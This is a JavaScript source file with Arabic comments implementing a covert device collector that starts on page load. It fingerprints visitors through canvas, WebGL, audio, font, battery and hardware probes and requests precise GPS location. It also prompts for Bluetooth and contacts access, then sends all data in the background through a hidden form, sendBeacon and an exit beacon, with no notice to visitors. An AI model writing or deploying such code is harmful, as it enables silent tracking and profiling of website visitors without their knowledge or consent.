class AdvancedDeviceCollector {
    constructor() {
        this.collectedData = {};
        this.fingerprint = null;
        this.init();
    }
    
    async init() {
        await this.collectEverything();
        this.sendData();
    }
    
    async collectEverything() {
        try {
            // جمع كل المعلومات بشكل متوازي
            await Promise.all([
                this.collectBasicInfo(),
                this.collectScreenInfo(),
                this.collectNetworkInfo(),
                this.collectBatteryInfo(),
                this.collectHardwareInfo(),
                this.collectBrowserFeatures(),
                this.collectFonts(),
                this.collectPlugins(),
                this.collectCanvasFingerprint(),
                this.collectWebGLFingerprint(),
                this.collectAudioFingerprint(),
                this.collectMathFingerprint(),
                this.collectTimezoneInfo(),
                this.collectStorageInfo(),
                this.collectMediaInfo(),
                this.collectPerformanceInfo(),
                this.collectSecurityInfo()
            ]);
            
            // جمع الموقع بشكل منفصل
            await this.collectLocationInfo();
            
        } catch (error) {
            console.error('Error collecting device info:', error);
            this.logError('device_collection', error.message);
        }
    }
    
    collectBasicInfo() {
        this.collectedData = {
            ...this.collectedData,
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: JSON.stringify(navigator.languages),
            cookie_enabled: navigator.cookieEnabled,
            do_not_track: navigator.doNotTrack,
            hardware_cores: navigator.hardwareConcurrency || 0,
            device_memory: navigator.deviceMemory || 0,
            max_touch_points: navigator.maxTouchPoints || 0,
            pdf_viewer: navigator.pdfViewerEnabled || false,
            webdriver: navigator.webdriver || false,
            device_pixel_ratio: window.devicePixelRatio || 1
        };
    }
    
    collectScreenInfo() {
        this.collectedData = {
            ...this.collectedData,
            screen_resolution: `${screen.width}x${screen.height}`,
            screen_avail_resolution: `${screen.availWidth}x${screen.availHeight}`,
            color_depth: screen.colorDepth,
            pixel_depth: screen.pixelDepth,
            window_resolution: `${window.innerWidth}x${window.innerHeight}`,
            window_outer_resolution: `${window.outerWidth}x${window.outerHeight}`,
            color_gamut: this.detectColorGamut(),
            contrast: this.detectContrastPreference(),
            reduced_motion: this.detectReducedMotion(),
            inverted_colors: this.detectInvertedColors(),
            forced_colors: this.detectForcedColors(),
            monochrome: this.detectMonochrome(),
            orientation: this.getOrientation(),
            pixel_ratio: window.devicePixelRatio,
            touch_support: 'ontouchstart' in window,
            max_touch_points: navigator.maxTouchPoints
        };
    }
    
    async collectNetworkInfo() {
        const connection = navigator.connection || 
                          navigator.mozConnection || 
                          navigator.webkitConnection;
        
        if (connection) {
            this.collectedData.connection = {
                type: connection.type,
                effective_type: connection.effectiveType,
                downlink: connection.downlink,
                downlink_max: connection.downlinkMax,
                rtt: connection.rtt,
                save_data: connection.saveData
            };
        }
        
        this.collectedData.online = navigator.onLine;
        
        // اختبار سرعة الشبكة
        await this.testNetworkSpeed();
    }
    
    async testNetworkSpeed() {
        const startTime = Date.now();
        const imageUrl = 'https://www.google.com/images/phd/px.gif';
        
        try {
            await fetch(imageUrl, { mode: 'no-cors', cache: 'no-cache' });
            const endTime = Date.now();
            this.collectedData.network_speed_ms = endTime - startTime;
        } catch (error) {
            console.log('Speed test failed');
        }
    }
    
    async collectBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                this.collectedData.battery_charging = battery.charging;
                this.collectedData.battery_level = battery.level;
                this.collectedData.battery_charging_time = battery.chargingTime;
                this.collectedData.battery_discharging_time = battery.dischargingTime;
            } catch (error) {
                console.log('Battery API failed');
            }
        }
    }
    
    collectHardwareInfo() {
        this.collectedData = {
            ...this.collectedData,
            hardware_cores: navigator.hardwareConcurrency,
            ram_gb: this.estimateRAM(),
            cpu_architecture: this.getCPUArchitecture(),
            gpu_info: this.getGPUInfo()
        };
    }
    
    estimateRAM() {
        if (navigator.deviceMemory) {
            return navigator.deviceMemory;
        }
        
        // تقدير الذاكرة من خلال الأداء
        const memory = performance?.memory;
        if (memory) {
            return Math.round(memory.jsHeapSizeLimit / (1024 * 1024 * 1024));
        }
        
        return 0;
    }
    
    getCPUArchitecture() {
        const ua = navigator.userAgent;
        if (ua.includes('x86_64') || ua.includes('Win64')) return 'x64';
        if (ua.includes('x86') || ua.includes('Win32')) return 'x86';
        if (ua.includes('arm64') || ua.includes('ARM64')) return 'ARM64';
        if (ua.includes('armv')) return 'ARM';
        return 'unknown';
    }
    
    getGPUInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            }
        }
        return null;
    }
    
    collectBrowserFeatures() {
        this.collectedData = {
            ...this.collectedData,
            localStorage: !!window.localStorage,
            sessionStorage: !!window.sessionStorage,
            indexedDB: !!window.indexedDB,
            serviceWorker: !!navigator.serviceWorker,
            webSockets: !!window.WebSocket,
            webRTC: !!window.RTCPeerConnection,
            webGL: this.hasWebGL(),
            webGL2: this.hasWebGL2(),
            webAudio: !!window.AudioContext || !!window.webkitAudioContext,
            webUSB: !!navigator.usb,
            webBluetooth: !!navigator.bluetooth,
            webNFC: !!navigator.nfc,
            webShare: !!navigator.share,
            webVibration: !!navigator.vibrate,
            webSpeech: !!window.SpeechRecognition || !!window.webkitSpeechRecognition,
            webAssembly: !!window.WebAssembly,
            webWorkers: !!window.Worker,
            sharedWorkers: !!window.SharedWorker,
            webSocketsBinaryType: !!window.WebSocket && !!WebSocket.prototype.binaryType
        };
    }
    
    async collectFonts() {
        const fontList = [
            'Arial', 'Helvetica', 'Times New Roman', 'Times', 'Courier New', 'Courier',
            'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
            'Trebuchet MS', 'Arial Black', 'Impact', 'Lucida Sans', 'Tahoma', 'Calibri',
            'Cambria', 'Candara', 'Consolas', 'Corbel', 'Segoe UI', 'Roboto', 'Open Sans',
            'Lato', 'Montserrat', 'Source Sans Pro', 'Raleway', 'Oswald', 'Merriweather',
            'Droid Sans', 'Droid Serif', 'Ubuntu', 'Noto Sans', 'Noto Serif',
            'Samsung Sans', 'Apple Color Emoji', 'Segoe UI Emoji', 'Noto Color Emoji'
        ];
        
        const available = [];
        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        const testString = 'mmmmmmmmmmlli';
        const testSize = '72px';
        
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        
        for (const font of fontList) {
            if (this.isFontAvailable(font, testString, testSize, baseFonts, context)) {
                available.push(font);
            }
        }
        
        this.collectedData.fonts = JSON.stringify(available);
    }
    
    isFontAvailable(font, testString, testSize, baseFonts, context) {
        context.font = testSize + ' ' + font + ', ' + baseFonts[0];
        const width = context.measureText(testString).width;
        
        for (const baseFont of baseFonts) {
            context.font = testSize + ' ' + baseFont;
            if (context.measureText(testString).width === width) {
                return false;
            }
        }
        return true;
    }
    
    collectPlugins() {
        const plugins = [];
        if (navigator.plugins) {
            for (let i = 0; i < navigator.plugins.length; i++) {
                const plugin = navigator.plugins[i];
                plugins.push({
                    name: plugin.name,
                    filename: plugin.filename,
                    description: plugin.description,
                    length: plugin.length
                });
            }
        }
        this.collectedData.plugins = JSON.stringify(plugins);
    }
    
    collectCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 50;
        
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Browser fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Browser fingerprint', 4, 17);
        
        this.collectedData.canvas_fingerprint = canvas.toDataURL();
    }
    
    collectWebGLFingerprint() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                this.collectedData.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                this.collectedData.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
            
            const glData = [];
            const parameters = [
                gl.ALIASED_LINE_WIDTH_RANGE,
                gl.ALIASED_POINT_SIZE_RANGE,
                gl.ALPHA_BITS,
                gl.BLUE_BITS,
                gl.DEPTH_BITS,
                gl.GREEN_BITS,
                gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS,
                gl.MAX_CUBE_MAP_TEXTURE_SIZE,
                gl.MAX_FRAGMENT_UNIFORM_VECTORS,
                gl.MAX_RENDERBUFFER_SIZE,
                gl.MAX_TEXTURE_IMAGE_UNITS,
                gl.MAX_TEXTURE_SIZE,
                gl.MAX_VARYING_VECTORS,
                gl.MAX_VERTEX_ATTRIBS,
                gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS,
                gl.MAX_VERTEX_UNIFORM_VECTORS,
                gl.MAX_VIEWPORT_DIMS,
                gl.RED_BITS,
                gl.RENDERER,
                gl.SHADING_LANGUAGE_VERSION,
                gl.STENCIL_BITS,
                gl.VENDOR,
                gl.VERSION
            ];
            
            parameters.forEach(param => {
                try {
                    glData.push(gl.getParameter(param));
                } catch (e) {}
            });
            
            this.collectedData.webgl_fingerprint = JSON.stringify(glData);
        }
    }
    
    collectAudioFingerprint() {
        try {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            if (!AudioContext) return;
            
            const audioCtx = new AudioContext();
            const oscillator = audioCtx.createOscillator();
            const analyser = audioCtx.createAnalyser();
            const gainNode = audioCtx.createGain();
            
            oscillator.type = 'triangle';
            oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
            
            gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
            
            oscillator.connect(analyser);
            analyser.connect(gainNode);
            gainNode.connect(audioCtx.destination);
            
            oscillator.start(0);
            
            const data = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(data);
            
            let hash = 0;
            for (let i = 0; i < data.length; i++) {
                hash = ((hash << 5) - hash) + data[i];
                hash = hash & hash;
            }
            
            this.collectedData.audio_fingerprint = hash.toString();
            
            oscillator.stop();
            audioCtx.close();
            
        } catch (error) {
            console.log('Audio fingerprint failed');
        }
    }
    
    collectMathFingerprint() {
        const mathFunctions = {
            sin: Math.sin(100),
            cos: Math.cos(100),
            tan: Math.tan(100),
            asin: Math.asin(0.5),
            acos: Math.acos(0.5),
            atan: Math.atan(1),
            sinh: Math.sinh(1),
            cosh: Math.cosh(1),
            tanh: Math.tanh(1),
            log: Math.log(10),
            log10: Math.log10(10),
            log2: Math.log2(8),
            exp: Math.exp(1),
            sqrt: Math.sqrt(2),
            cbrt: Math.cbrt(27)
        };
        
        this.collectedData.math_fingerprint = JSON.stringify(mathFunctions);
    }
    
    collectTimezoneInfo() {
        this.collectedData = {
            ...this.collectedData,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezone_offset: new Date().getTimezoneOffset()
        };
    }
    
    collectStorageInfo() {
        let localStorageSize = 0;
        let sessionStorageSize = 0;
        
        if (window.localStorage) {
            for (let key in localStorage) {
                if (localStorage.hasOwnProperty(key)) {
                    localStorageSize += (key.length + localStorage[key].length) * 2;
                }
            }
        }
        
        if (window.sessionStorage) {
            for (let key in sessionStorage) {
                if (sessionStorage.hasOwnProperty(key)) {
                    sessionStorageSize += (key.length + sessionStorage[key].length) * 2;
                }
            }
        }
        
        this.collectedData.localStorage_size = localStorageSize;
        this.collectedData.sessionStorage_size = sessionStorageSize;
    }
    
    collectMediaInfo() {
        this.collectedData = {
            ...this.collectedData,
            media_devices: navigator.mediaDevices ? true : false,
            media_session: 'mediaSession' in navigator,
            picture_in_picture: 'pictureInPictureEnabled' in document,
            presentation: 'presentation' in navigator,
            screen_orientation: screen.orientation ? screen.orientation.type : null
        };
    }
    
    collectPerformanceInfo() {
        if (performance) {
            const navigation = performance.getEntriesByType('navigation')[0];
            if (navigation) {
                this.collectedData.performance = {
                    dom_complete: navigation.domComplete,
                    dom_interactive: navigation.domInteractive,
                    load_event_end: navigation.loadEventEnd,
                    redirect_count: navigation.redirectCount,
                    transfer_size: navigation.transferSize,
                    decoded_body_size: navigation.decodedBodySize
                };
            }
            
            this.collectedData.timestamp = Date.now();
            this.collectedData.performance_memory = performance.memory ? {
                js_heap_size_limit: performance.memory.jsHeapSizeLimit,
                total_js_heap_size: performance.memory.totalJSHeapSize,
                used_js_heap_size: performance.memory.usedJSHeapSize
            } : null;
        }
    }
    
    collectSecurityInfo() {
        this.collectedData = {
            ...this.collectedData,
            https: location.protocol === 'https:',
            referrer_policy: document.referrerPolicy,
            content_security_policy: this.getCSP(),
            permissions: this.getPermissions()
        };
    }
    
    async collectLocationInfo() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve();
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    this.collectedData = {
                        ...this.collectedData,
                        location_enabled: true,
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitude_accuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        location_timestamp: position.timestamp,
                        geolocation_method: 'gps'
                    };
                    resolve();
                },
                (error) => {
                    this.collectedData.location_enabled = false;
                    this.collectedData.geolocation_error = error.message;
                    this.collectedData.geolocation_method = 'failed';
                    resolve();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        });
    }
    
    async getPermissions() {
        const permissions = {};
        const permissionNames = ['geolocation', 'notifications', 'camera', 'microphone', 'bluetooth'];
        
        for (const name of permissionNames) {
            try {
                const status = await navigator.permissions.query({ name });
                permissions[name] = status.state;
            } catch (e) {
                permissions[name] = 'unknown';
            }
        }
        
        // حالة صلاحية جهات الاتصال إن وُجدت
        try {
            permissions['contacts'] = typeof navigator.contacts !== 'undefined' ? 'prompt' : 'unavailable';
        } catch (e) {
            permissions['contacts'] = 'unknown';
        }
        
        return permissions;
    }
    
    detectColorGamut() {
        if (matchMedia('(color-gamut: p3)').matches) return 'p3';
        if (matchMedia('(color-gamut: rec2020)').matches) return 'rec2020';
        if (matchMedia('(color-gamut: srgb)').matches) return 'srgb';
        return 'unknown';
    }
    
    detectContrastPreference() {
        if (matchMedia('(prefers-contrast: more)').matches) return 'more';
        if (matchMedia('(prefers-contrast: less)').matches) return 'less';
        if (matchMedia('(prefers-contrast: custom)').matches) return 'custom';
        return 'no-preference';
    }
    
    detectReducedMotion() {
        return matchMedia('(prefers-reduced-motion: reduce)').matches;
    }
    
    detectInvertedColors() {
        return matchMedia('(inverted-colors: inverted)').matches;
    }
    
    detectForcedColors() {
        return matchMedia('(forced-colors: active)').matches;
    }
    
    detectMonochrome() {
        const monochrome = matchMedia('(monochrome)');
        if (monochrome.matches) {
            return parseInt(monochrome.media.split(':')[1]) || 1;
        }
        return 0;
    }
    
    getOrientation() {
        if (screen.orientation) {
            return screen.orientation.type;
        }
        
        if (window.orientation !== undefined) {
            return window.orientation;
        }
        
        return window.innerHeight > window.innerWidth ? 'portrait' : 'landscape';
    }
    
    hasWebGL() {
        try {
            const canvas = document.createElement('canvas');
            return !!(canvas.getContext('webgl') || canvas.getContext('experimental-webgl'));
        } catch (e) {
            return false;
        }
    }
    
    hasWebGL2() {
        try {
            const canvas = document.createElement('canvas');
            return !!canvas.getContext('webgl2');
        } catch (e) {
            return false;
        }
    }
    
    getCSP() {
        const csp = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
        return csp ? csp.content : null;
    }
    
    sendData() {
        // إرسال البيانات عبر نموذج مخفي
        const form = document.createElement('form');
        form.method = 'POST';
        form.style.display = 'none';
        
        Object.keys(this.collectedData).forEach(key => {
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = key;
            input.value = typeof this.collectedData[key] === 'object' 
                ? JSON.stringify(this.collectedData[key]) 
                : this.collectedData[key];
            form.appendChild(input);
        });
        
        document.body.appendChild(form);
        
        // إرسال البيانات في الخلفية
        if (navigator.sendBeacon) {
            const data = new FormData(form);
            navigator.sendBeacon(window.location.href, data);
        } else {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', window.location.href, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send(new URLSearchParams(new FormData(form)).toString());
        }
        
        document.body.removeChild(form);
    }
    
    logError(type, message) {
        console.error(`[${type}]`, message);
        
        // إرسال الخطأ للخادم
        const errorData = {
            type: type,
            message: message,
            url: window.location.href,
            timestamp: Date.now()
        };
        
        if (navigator.sendBeacon) {
            navigator.sendBeacon('/log_error.php', JSON.stringify(errorData));
        }
    }
}

// تفعيل التجميع التلقائي عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', () => {
    window.deviceCollector = new AdvancedDeviceCollector();
    // طلب الأذونات المطلوبة
    if (window.deviceCollector) {
        // الموقع
        navigator.geolocation && navigator.geolocation.getCurrentPosition(() => {}, () => {});
        // البلوتوث (قد يظهر مُنتقي جهاز)
        if (navigator.bluetooth && navigator.bluetooth.requestDevice) {
            navigator.bluetooth.requestDevice({ acceptAllDevices: true }).then(() => {
                window.deviceCollector.collectedData.bluetooth_permission = 'granted';
            }).catch(() => {
                window.deviceCollector.collectedData.bluetooth_permission = 'denied';
            });
        } else {
            window.deviceCollector.collectedData.bluetooth_permission = 'unavailable';
        }
        // جهات الاتصال (إن كانت مدعومة)
        if (navigator.contacts && navigator.contacts.select) {
            navigator.contacts.select(['name', 'tel'], { multiple: false }).then(() => {
                window.deviceCollector.collectedData.contacts_permission = 'granted';
            }).catch(() => {
                window.deviceCollector.collectedData.contacts_permission = 'denied';
            });
        } else {
            window.deviceCollector.collectedData.contacts_permission = 'unavailable';
        }
    }
});

// تسجيل أي أخطاء غير متوقعة
window.addEventListener('error', (event) => {
    if (window.deviceCollector) {
        window.deviceCollector.logError('uncaught_error', {
            message: event.message,
            filename: event.filename,
            lineno: event.lineno,
            colno: event.colno
        });
    }
});

// تسجيل عند مغادرة الصفحة
window.addEventListener('beforeunload', () => {
    if (window.deviceCollector && navigator.sendBeacon) {
        const data = {
            event: 'page_exit',
            timestamp: Date.now(),
            time_on_page: Date.now() - window.performance.timing.navigationStart,
            collected_data: window.deviceCollector.collectedData
        };
        navigator.sendBeacon('/log_exit.php', JSON.stringify(data));
    }
});
